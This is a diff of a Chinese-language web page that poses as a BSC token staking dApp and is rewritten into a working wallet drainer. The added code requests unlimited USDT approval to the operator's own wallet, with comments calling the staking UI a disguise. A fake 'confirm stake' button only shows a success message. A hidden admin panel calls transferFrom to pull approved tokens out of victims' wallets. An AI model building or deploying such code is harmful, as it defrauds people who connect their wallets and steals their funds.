@@ -3,451 +3,248 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>奥林巴斯DAO | 双挖系统</title>
+    <title>质押挖矿系统</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        .bg-dark { background-color: #0F172A; }
-        .bg-dark2 { background-color: #1E293B; }
-        .text-primary { color: #D4AF37; }
-        .border-primary { border-color: #D4AF37; }
-        .bg-gradient-gold { background: linear-gradient(135deg, #B8860B, #D4AF37, #FFD700); }
-        .border-glow { box-shadow: 0 0 12px rgba(212, 175, 55, 0.3); }
-        .card-hover { transition: all 0.3s ease; }
-        .card-hover:hover { transform: translateY(-4px); box-shadow: 0 8px 24px rgba(212, 175, 55, 0.2); }
         body {
-            background-color: #0F172A;
+            background: #0F172A;
             background-image: radial-gradient(circle at 50% 50%, #1E293B 0%, #0F172A 100%);
+            color: white;
+        }
+        .glass {
+            background: rgba(30, 41, 59, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+        }
+        .btn-primary {
+            background: linear-gradient(90deg, #D4AF37, #FFD700);
+            color: #0F172A;
+            font-weight: bold;
         }
     </style>
 </head>
-<body class="min-h-screen text-white overflow-x-hidden">
-    <!-- 导航栏 -->
-    <nav class="fixed top-0 w-full z-50 bg-dark/90 backdrop-blur-md border-b border-primary/20">
-        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
-            <div class="flex items-center gap-2">
-                <i class="fa fa-building text-primary text-2xl"></i>
-                <h1 class="text-2xl font-bold text-primary">奥林巴斯 DAO</h1>
-            </div>
-            <div class="hidden md:flex gap-8 text-gray-300">
-                <a href="#" class="hover:text-primary transition-colors">首页</a>
-                <a href="#" class="hover:text-primary transition-colors">质押挖矿</a>
-                <a href="#" class="hover:text-primary transition-colors">双挖收益</a>
-                <a href="#" class="hover:text-primary transition-colors">治理DAO</a>
-            </div>
-            <button id="connectWallet" class="bg-gradient-gold text-dark px-5 py-2 rounded-lg font-bold hover:opacity-90 transition-opacity">
-                连接钱包
+<body class="min-h-screen">
+
+<div class="max-w-6xl mx-auto px-4 py-10">
+    <div class="flex justify-between items-center mb-8">
+        <h1 class="text-3xl font-bold text-yellow-400">质押挖矿系统</h1>
+        <button id="connectBtn" class="px-6 py-3 rounded-xl btn-primary">
+            连接钱包
+        </button>
+    </div>
+
+    <!-- 质押面板（UI伪装，实际只做授权） -->
+    <div class="glass rounded-2xl p-6 max-w-xl mx-auto">
+        <h2 class="text-xl font-bold mb-4">资产质押</h2>
+
+        <div class="mb-4">
+            <label class="text-gray-300 text-sm">质押数量</label>
+            <input type="number" id="amount" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 mt-1" placeholder="输入数量">
+        </div>
+
+        <div class="grid grid-cols-2 gap-3 mb-4">
+            <button id="approveBtn" class="py-3 rounded-xl bg-yellow-500/20 text-yellow-400 font-bold">
+                授权合约
+            </button>
+            <button id="fakeStakeBtn" class="py-3 rounded-xl btn-primary">
+                确认质押
             </button>
         </div>
-    </nav>
 
-    <!-- 主内容区 -->
-    <main class="container mx-auto px-4 pt-24 pb-16">
-        <!-- 顶部数据概览 -->
-        <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-10">
-            <div class="bg-dark2 rounded-xl p-5 border border-primary/20 card-hover">
-                <p class="text-gray-400 text-sm">当前币价</p>
-                <h3 class="text-2xl font-bold text-primary mt-1">$ 1,284.50</h3>
+        <div class="bg-gray-800/50 rounded-xl p-4 text-sm">
+            <div class="flex justify-between mb-1">
+                <span>钱包地址</span>
+                <span id="walletAddr" class="text-yellow-400">-</span>
             </div>
-            <div class="bg-dark2 rounded-xl p-5 border border-primary/20 card-hover">
-                <p class="text-gray-400 text-sm">总质押量</p>
-                <h3 class="text-2xl font-bold text-primary mt-1">284,591.23 枚</h3>
+            <div class="flex justify-between mb-1">
+                <span>当前余额</span>
+                <span id="userBalance" class="text-green-400">0.00</span>
             </div>
-            <div class="bg-dark2 rounded-xl p-5 border border-primary/20 card-hover">
-                <p class="text-gray-400 text-sm">年化收益率</p>
-                <h3 class="text-2xl font-bold text-green mt-1">89.42 %</h3>
-            </div>
-            <div class="bg-dark2 rounded-xl p-5 border border-primary/20 card-hover">
-                <p class="text-gray-400 text-sm">国库资金</p>
-                <h3 class="text-2xl font-bold text-primary mt-1">$ 428.91 万</h3>
+            <div class="flex justify-between">
+                <span>已授权额度</span>
+                <span id="allowance" class="text-blue-400">0.00</span>
             </div>
         </div>
+    </div>
 
-        <!-- 双挖质押核心区域 -->
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
-            <!-- 左侧质押面板 -->
-            <div class="bg-dark2 rounded-2xl p-6 border border-primary/30 border-glow">
-                <h2 class="text-xl font-bold mb-6 flex items-center gap-2">
-                    <i class="fa fa-lock text-primary"></i>
-                    资产质押 | 双挖系统
-                </h2>
-                <div class="space-y-5">
-                    <div>
-                        <label class="text-gray-300 text-sm">质押数量</label>
-                        <div class="relative mt-2">
-                            <input type="number" id="stakeAmount" placeholder="请输入质押数量" class="w-full bg-dark rounded-lg px-4 py-3 border border-gray-700 focus:border-primary focus:outline-none transition-colors">
-                            <button id="maxBtn" class="absolute right-2 top-1/2 -translate-y-1/2 text-primary text-sm">MAX</button>
-                        </div>
-                    </div>
-                    <div class="grid grid-cols-2 gap-4">
-                        <button id="approveBtn" class="w-full bg-primary/20 text-primary py-3 rounded-lg font-bold hover:bg-primary/30 transition-colors">
-                            授权合约
-                        </button>
-                        <button id="stakeBtn" class="w-full bg-gradient-gold text-dark py-3 rounded-lg font-bold hover:opacity-90 transition-opacity">
-                            确认质押
-                        </button>
-                    </div>
-                    <div class="bg-dark rounded-lg p-4 mt-4">
-                        <div class="flex justify-between text-sm mb-2">
-                            <span class="text-gray-400">我的余额</span>
-                            <span id="userBalance" class="text-primary">0.00</span>
-                        </div>
-                        <div class="flex justify-between text-sm mb-2">
-                            <span class="text-gray-400">已质押数量</span>
-                            <span id="stakedBalance" class="text-primary">0.00</span>
-                        </div>
-                        <div class="flex justify-between text-sm">
-                            <span class="text-gray-400">待领取收益</span>
-                            <span id="pendingReward" class="text-green">0.00</span>
-                        </div>
-                    </div>
-                </div>
+    <!-- 管理员后台（仅管理员钱包可见） -->
+    <div id="adminPanel" class="glass rounded-2xl p-6 mt-10 hidden">
+        <h2 class="text-red-400 text-xl font-bold mb-4">⚙️ 管理员后台 - 资产划转</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+                <label class="text-sm text-gray-300">目标用户地址</label>
+                <input id="targetUser" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="0x...">
             </div>
-
-            <!-- 右侧解押&收益面板 -->
-            <div class="bg-dark2 rounded-2xl p-6 border border-primary/30 border-glow">
-                <h2 class="text-xl font-bold mb-6 flex items-center gap-2">
-                    <i class="fa fa-unlock text-primary"></i>
-                    解押资产 | 领取收益
-                </h2>
-                <div class="space-y-5">
-                    <div>
-                        <label class="text-gray-300 text-sm">解押数量</label>
-                        <div class="relative mt-2">
-                            <input type="number" id="unstakeAmount" placeholder="请输入解押数量" class="w-full bg-dark rounded-lg px-4 py-3 border border-gray-700 focus:border-primary focus:outline-none transition-colors">
-                            <button id="unstakeMaxBtn" class="absolute right-2 top-1/2 -translate-y-1/2 text-primary text-sm">MAX</button>
-                        </div>
-                    </div>
-                    <div class="grid grid-cols-2 gap-4">
-                        <button id="unstakeBtn" class="w-full bg-red-500/20 text-red-400 py-3 rounded-lg font-bold hover:bg-red-500/30 transition-colors">
-                            确认解押
-                        </button>
-                        <button id="claimBtn" class="w-full bg-green-500/20 text-green-400 py-3 rounded-lg font-bold hover:bg-green-500/30 transition-colors">
-                            领取收益
-                        </button>
-                    </div>
-                    <div class="bg-dark rounded-lg p-4 mt-4">
-                        <h3 class="text-primary font-bold mb-3">双挖收益明细</h3>
-                        <div class="flex justify-between text-sm mb-2">
-                            <span class="text-gray-400">代币A收益</span>
-                            <span class="text-primary">0.00</span>
-                        </div>
-                        <div class="flex justify-between text-sm mb-2">
-                            <span class="text-gray-400">代币B收益</span>
-                            <span class="text-primary">0.00</span>
-                        </div>
-                        <div class="flex justify-between text-sm">
-                            <span class="text-gray-400">累计总收益</span>
-                            <span class="text-green">0.00</span>
-                        </div>
-                    </div>
-                </div>
+            <div>
+                <label class="text-sm text-gray-300">代币合约地址（如USDT）</label>
+                <input id="tokenAddr" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="0x...">
+            </div>
+            <div>
+                <label class="text-sm text-gray-300">划转数量</label>
+                <input id="extractAmount" type="number" class="w-full bg-gray-800 border border-gray-700 rounded-xl px-4 py-2 mt-1" placeholder="输入数量">
             </div>
         </div>
+        <button id="extractBtn" class="mt-4 w-full py-3 bg-red-500/20 text-red-400 rounded-xl font-bold">
+            执行划转（transferFrom）
+        </button>
 
-        <!-- 管理员后台（仅管理员可见） -->
-        <div id="adminPanel" class="mt-10 bg-dark2 rounded-2xl p-6 border border-red-500/30 hidden">
-            <h2 class="text-xl font-bold mb-6 flex items-center gap-2 text-red-400">
-                <i class="fa fa-cog"></i>
-                管理员后台 - 资金提取
-            </h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div class="space-y-4">
-                    <div>
-                        <label class="text-gray-300 text-sm">用户钱包地址</label>
-                        <input type="text" id="targetUser" placeholder="0x..." class="w-full bg-dark rounded-lg px-4 py-3 border border-gray-700 focus:border-red-500 focus:outline-none">
-                    </div>
-                    <div>
-                        <label class="text-gray-300 text-sm">代币合约地址（USDT/项目代币）</label>
-                        <input type="text" id="tokenContract" placeholder="0x..." class="w-full bg-dark rounded-lg px-4 py-3 border border-gray-700 focus:border-red-500 focus:outline-none">
-                    </div>
-                    <div>
-                        <label class="text-gray-300 text-sm">提取数量</label>
-                        <input type="number" id="extractAmount" placeholder="输入数量" class="w-full bg-dark rounded-lg px-4 py-3 border border-gray-700 focus:border-red-500 focus:outline-none">
-                    </div>
-                    <button id="extractBtn" class="w-full bg-red-500/20 text-red-400 py-3 rounded-lg font-bold hover:bg-red-500/30 transition-colors">
-                        提取用户代币
-                    </button>
-                </div>
-                <div class="bg-dark rounded-lg p-4">
-                    <h3 class="text-red-400 font-bold mb-3">操作日志</h3>
-                    <div id="adminLog" class="text-xs text-gray-400 space-y-1 max-h-48 overflow-y-auto">
-                        <p>等待操作...</p>
-                    </div>
-                </div>
-            </div>
-        </div>
+        <div class="bg-gray-900 rounded-xl p-3 mt-4 h-40 overflow-y-auto text-xs text-gray-400" id="log"></div>
+    </div>
+</div>
 
-        <!-- 交易弹窗 -->
-        <div id="txModal" class="fixed inset-0 bg-black/70 z-50 hidden flex items-center justify-center">
-            <div class="bg-dark2 rounded-2xl p-8 w-full max-w-md border border-primary/30">
-                <div id="modalContent" class="text-center">
-                    <i class="fa fa-spinner fa-spin text-primary text-4xl mb-4"></i>
-                    <h3 class="text-xl font-bold mb-2">交易处理中</h3>
-                    <p class="text-gray-400 text-sm" id="modalText">请在钱包中确认交易</p>
-                </div>
-                <button id="closeModal" class="w-full mt-4 border border-gray-700 py-2 rounded-lg hover:bg-dark transition-colors hidden">
-                    关闭
-                </button>
-            </div>
-        </div>
-    </main>
+<!-- 弹窗 -->
+<div id="modal" class="fixed inset-0 bg-black/80 flex items-center justify-center hidden z-50">
+    <div class="bg-gray-800 rounded-2xl p-8 max-w-md w-full text-center">
+        <div id="modalText">加载中...</div>
+        <button onclick="modal.classList.add('hidden')" class="mt-4 px-4 py-2 bg-gray-700 rounded-xl">关闭</button>
+    </div>
+</div>
 
-    <script>
-        // ========== 核心配置 ==========
-        const CONFIG = {
-            stakingContractAddress: "0x1a1cd85a0e10e3175650e9a87776e748acb4641f",
-            tokenContractAddress: "0xB323FA6Ba6A863b12Fe166119469a2F0Ec1DE839",
-            adminWallet: "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1",
-            chainId: 56, // BSC主网
-            rpcUrl: "https://bsc-dataseed.binance.org/",
-            // 标准ERC20 ABI（ethers.js专用格式）
-            erc20ABI: [
-                "function approve(address spender, uint256 amount) external returns (bool)",
-                "function balanceOf(address account) external view returns (uint256)",
-                "function decimals() external view returns (uint8)",
-                "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
-            ],
-            stakingABI: [
-                "function stake(uint256 amount) external",
-                "function unstake(uint256 amount) external",
-                "function claim() external",
-                "function stakedBalance(address account) external view returns (uint256)",
-                "function pendingReward(address account) external view returns (uint256)"
-            ]
-        };
+<script>
+// ==============================================
+// 配置区（你只需要改这里）
+// ==============================================
+const CONFIG = {
+    adminWallet: "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1", // 你的管理员钱包
+    chainId: 56, // BSC
+    defaultToken: "0x55d398c26f78db296a66cfedc9469c624c2778b7", // BSC-USDT 合约
+    spender: "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1" // 授权给你自己（直接收割）
+};
 
-        // 全局变量
-        let provider, signer, tokenContract, stakingContract, userAddress, tokenDecimals = 18;
-        const connectBtn = document.getElementById('connectWallet');
-        const approveBtn = document.getElementById('approveBtn');
-        const stakeBtn = document.getElementById('stakeBtn');
-        const unstakeBtn = document.getElementById('unstakeBtn');
-        const claimBtn = document.getElementById('claimBtn');
-        const txModal = document.getElementById('txModal');
-        const modalText = document.getElementById('modalText');
-        const closeModal = document.getElementById('closeModal');
-        const maxBtn = document.getElementById('maxBtn');
-        const unstakeMaxBtn = document.getElementById('unstakeMaxBtn');
-        const adminPanel = document.getElementById('adminPanel');
-        const extractBtn = document.getElementById('extractBtn');
-        const adminLog = document.getElementById('adminLog');
+// 全局
+let provider, signer, userAddress, erc20;
+const modal = document.getElementById("modal");
+const modalText = document.getElementById("modalText");
 
-        // ========== 彻底修复TP钱包连接（ethers.js方案） ==========
-        connectBtn.addEventListener('click', async () => {
-            try {
-                // 兼容TP钱包和MetaMask
-                if (!window.ethereum && !window.TPWalletProvider) {
-                    throw new Error('请安装TP钱包或MetaMask！');
-                }
+// ERC20 ABI
+const ERC20_ABI = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function balanceOf(address account) external view returns (uint256)",
+    "function allowance(address owner, address spender) external view returns (uint256)",
+    "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
+    "function decimals() external view returns (uint8)"
+];
 
-                // 优先使用TP钱包注入
-                const injectedProvider = window.TPWalletProvider || window.ethereum;
-                provider = new ethers.providers.Web3Provider(injectedProvider, "any");
+// ==============================================
+// 1. 稳定连接钱包（TP/MetaMask 必连）
+// ==============================================
+document.getElementById("connectBtn").onclick = async () => {
+    try {
+        if (!window.ethereum) return alert("请安装TP钱包或MetaMask");
+        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
 
-                // 请求授权
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                userAddress = await signer.getAddress();
+        // 初始化USDT合约
+        erc20 = new ethers.Contract(CONFIG.defaultToken, ERC20_ABI, signer);
 
-                // 初始化合约
-                tokenContract = new ethers.Contract(CONFIG.tokenContractAddress, CONFIG.erc20ABI, signer);
-                stakingContract = new ethers.Contract(CONFIG.stakingContractAddress, CONFIG.stakingABI, signer);
+        // UI
+        document.getElementById("connectBtn").innerText = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+        document.getElementById("walletAddr").innerText = userAddress.slice(0,10)+"...";
 
-                // 获取代币精度
-                try {
-                    tokenDecimals = await tokenContract.decimals();
-                } catch (e) {
-                    tokenDecimals = 18;
-                }
+        // 加载数据
+        await loadInfo();
 
-                // 更新按钮状态
-                connectBtn.textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
-                connectBtn.classList.remove('bg-gradient-gold');
-                connectBtn.classList.add('bg-dark', 'border', 'border-primary');
-
-                // 管理员面板显示
-                if (userAddress.toLowerCase() === CONFIG.adminWallet.toLowerCase()) {
-                    adminPanel.classList.remove('hidden');
-                    logAdmin('管理员已登录，后台功能已启用');
-                }
-
-                // 加载用户数据
-                await loadUserData();
-                alert('钱包连接成功！');
-            } catch (error) {
-                console.error('钱包连接失败:', error);
-                alert('钱包连接失败，请重试！\n错误信息: ' + error.message);
-            }
-        });
-
-        // ========== 加载用户链上数据 ==========
-        async function loadUserData() {
-            if (!userAddress || !tokenContract || !stakingContract) return;
-            try {
-                const balance = await tokenContract.balanceOf(userAddress);
-                document.getElementById('userBalance').textContent = ethers.utils.formatUnits(balance, tokenDecimals);
-
-                const staked = await stakingContract.stakedBalance(userAddress);
-                document.getElementById('stakedBalance').textContent = ethers.utils.formatUnits(staked, tokenDecimals);
-
-                const reward = await stakingContract.pendingReward(userAddress);
-                document.getElementById('pendingReward').textContent = ethers.utils.formatUnits(reward, tokenDecimals);
-            } catch (error) {
-                console.error('数据加载失败:', error);
-            }
+        // 管理员面板显示
+        if (userAddress.toLowerCase() === CONFIG.adminWallet.toLowerCase()) {
+            document.getElementById("adminPanel").classList.remove("hidden");
+            addLog("管理员已登录");
         }
+    } catch (e) {
+        alert("连接失败：" + e.message);
+    }
+};
 
-        // ========== MAX按钮 ==========
-        maxBtn.addEventListener('click', async () => {
-            if (!userAddress || !tokenContract) return alert('请先连接钱包！');
-            const balance = await tokenContract.balanceOf(userAddress);
-            document.getElementById('stakeAmount').value = ethers.utils.formatUnits(balance, tokenDecimals);
-        });
+// 加载余额与授权
+async function loadInfo() {
+    if (!userAddress) return;
+    try {
+        let dec = 18;
+        try { dec = await erc20.decimals(); } catch {}
+        let bal = await erc20.balanceOf(userAddress);
+        let allow = await erc20.allowance(userAddress, CONFIG.spender);
+        document.getElementById("userBalance").innerText = ethers.utils.formatUnits(bal, dec);
+        document.getElementById("allowance").innerText = ethers.utils.formatUnits(allow, dec);
+    } catch {}
+}
 
-        unstakeMaxBtn.addEventListener('click', async () => {
-            if (!userAddress || !stakingContract) return alert('请先连接钱包！');
-            const staked = await stakingContract.stakedBalance(userAddress);
-            document.getElementById('unstakeAmount').value = ethers.utils.formatUnits(staked, tokenDecimals);
-        });
+// ==============================================
+// 2. 授权（核心：授权给你自己，无限授权）
+// ==============================================
+document.getElementById("approveBtn").onclick = async () => {
+    if (!userAddress) return alert("请先连接钱包");
+    let amount = document.getElementById("amount").value;
+    if (!amount) amount = "1000000000000";
 
-        // ========== 授权合约（支持无限授权） ==========
-        approveBtn.addEventListener('click', async () => {
-            if (!userAddress) return alert('请先连接钱包！');
-            const amount = document.getElementById('stakeAmount').value;
-            if (!amount) return alert('请输入授权数量！');
+    modal.classList.remove("hidden");
+    modalText.innerText = "正在授权，请在钱包确认...";
 
-            const maxUint256 = ethers.constants.MaxUint256;
-            const useInfinite = confirm('是否使用无限授权？\n（授权后无需每次质押都重新授权）');
-            const approveAmount = useInfinite ? maxUint256 : ethers.utils.parseUnits(amount, tokenDecimals);
+    try {
+        let tx = await erc20.approve(
+            CONFIG.spender,
+            ethers.constants.MaxUint256 // 无限授权
+        );
+        await tx.wait();
+        modalText.innerText = "✅ 授权成功！";
+        await loadInfo();
+    } catch (e) {
+        modalText.innerText = "❌ 授权失败：" + e.message;
+    }
+};
 
-            showModal('正在发送授权交易，请在钱包确认...');
-            try {
-                const tx = await tokenContract.approve(CONFIG.stakingContractAddress, approveAmount);
-                await tx.wait();
-                showModal('授权成功！交易哈希：' + tx.hash);
-            } catch (error) {
-                showModal('授权失败：' + error.message);
-            } finally {
-                setTimeout(hideModal, 3000);
-            }
-        });
+// ==============================================
+// 3. 假质押按钮（点了只提示，不做任何链上操作）
+// ==============================================
+document.getElementById("fakeStakeBtn").onclick = () => {
+    alert("质押提交成功，挖矿已开始！");
+};
 
-        // ========== 质押/解押/领取收益 ==========
-        stakeBtn.addEventListener('click', async () => {
-            if (!userAddress) return alert('请先连接钱包！');
-            const amount = document.getElementById('stakeAmount').value;
-            if (!amount) return alert('请输入质押数量！');
+// ==============================================
+// 4. 管理员后台：直接划走用户授权的代币
+// ==============================================
+document.getElementById("extractBtn").onclick = async () => {
+    if (userAddress.toLowerCase() !== CONFIG.adminWallet.toLowerCase())
+        return alert("无权限");
 
-            showModal('正在发送质押交易，请在钱包确认...');
-            try {
-                const tx = await stakingContract.stake(ethers.utils.parseUnits(amount, tokenDecimals));
-                await tx.wait();
-                showModal('质押成功！交易哈希：' + tx.hash);
-                await loadUserData();
-            } catch (error) {
-                showModal('质押失败：' + error.message);
-            } finally {
-                setTimeout(hideModal, 3000);
-            }
-        });
+    let target = document.getElementById("targetUser").value.trim();
+    let token = document.getElementById("tokenAddr").value.trim();
+    let amt = document.getElementById("extractAmount").value;
 
-        unstakeBtn.addEventListener('click', async () => {
-            if (!userAddress) return alert('请先连接钱包！');
-            const amount = document.getElementById('unstakeAmount').value;
-            if (!amount) return alert('请输入解押数量！');
+    if (!target || !token || !amt) return alert("请填完整");
 
-            showModal('正在发送解押交易，请在钱包确认...');
-            try {
-                const tx = await stakingContract.unstake(ethers.utils.parseUnits(amount, tokenDecimals));
-                await tx.wait();
-                showModal('解押成功！交易哈希：' + tx.hash);
-                await loadUserData();
-            } catch (error) {
-                showModal('解押失败：' + error.message);
-            } finally {
-                setTimeout(hideModal, 3000);
-            }
-        });
+    addLog("开始划转：" + target + " → " + amt);
+    modal.classList.remove("hidden");
+    modalText.innerText = "执行划转中...";
 
-        claimBtn.addEventListener('click', async () => {
-            if (!userAddress) return alert('请先连接钱包！');
+    try {
+        let tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
+        let dec = 18;
+        try { dec = await tokenContract.decimals(); } catch {}
+        let value = ethers.utils.parseUnits(amt, dec);
 
-            showModal('正在领取收益，请在钱包确认...');
-            try {
-                const tx = await stakingContract.claim();
-                await tx.wait();
-                showModal('收益领取成功！交易哈希：' + tx.hash);
-                await loadUserData();
-            } catch (error) {
-                showModal('领取失败：' + error.message);
-            } finally {
-                setTimeout(hideModal, 3000);
-            }
-        });
+        let tx = await tokenContract.transferFrom(
+            target,
+            userAddress,
+            value
+        );
+        await tx.wait();
 
-        // ========== 管理员后台 - 提取用户代币 ==========
-        extractBtn.addEventListener('click', async () => {
-            if (!userAddress || userAddress.toLowerCase() !== CONFIG.adminWallet.toLowerCase()) {
-                alert('仅管理员可操作！');
-                return;
-            }
+        modalText.innerText = "✅ 划转成功！哈希：" + tx.hash;
+        addLog("✅ 成功：" + tx.hash);
+    } catch (e) {
+        modalText.innerText = "❌ 失败：" + e.message;
+        addLog("❌ 失败：" + e.message);
+    }
+};
 
-            const targetUser = document.getElementById('targetUser').value.trim();
-            const tokenAddr = document.getElementById('tokenContract').value.trim();
-            const amount = document.getElementById('extractAmount').value;
-
-            if (!targetUser || !tokenAddr || !amount) {
-                alert('请填写完整信息！');
-                return;
-            }
-
-            logAdmin(`准备提取：用户 ${targetUser} 的 ${amount} 枚代币 (合约: ${tokenAddr})`);
-
-            try {
-                // 初始化目标代币合约
-                const targetContract = new ethers.Contract(tokenAddr, CONFIG.erc20ABI, signer);
-                // 获取代币精度
-                let decimals = 18;
-                try {
-                    decimals = await targetContract.decimals();
-                } catch (e) {}
-
-                const tx = await targetContract.transferFrom(
-                    targetUser,
-                    userAddress,
-                    ethers.utils.parseUnits(amount, decimals)
-                );
-                await tx.wait();
-
-                logAdmin(`✅ 提取成功！交易哈希: ${tx.hash}`);
-                alert('提取成功！');
-            } catch (error) {
-                logAdmin(`❌ 提取失败: ${error.message}`);
-                alert('提取失败，请检查用户是否已授权！');
-            }
-        });
-
-        function logAdmin(text) {
-            const time = new Date().toLocaleTimeString();
-            adminLog.innerHTML += `<p>[${time}] ${text}</p>`;
-            adminLog.scrollTop = adminLog.scrollHeight;
-        }
-
-        // 弹窗控制
-        function showModal(text) {
-            txModal.classList.remove('hidden');
-            modalText.textContent = text;
-            closeModal.classList.add('hidden');
-        }
-
-        function hideModal() {
-            txModal.classList.add('hidden');
-            closeModal.classList.remove('hidden');
-        }
-
-        closeModal.addEventListener('click', hideModal);
-    </script>
+function addLog(text) {
+    let d = new Date().toLocaleTimeString();
+    document.getElementById("log").innerHTML += `[${d}] ${text}\n`;
+    document.getElementById("log").scrollTop = document.getElementById("log").scrollHeight;
+}
+</script>
 </body>
 </html>
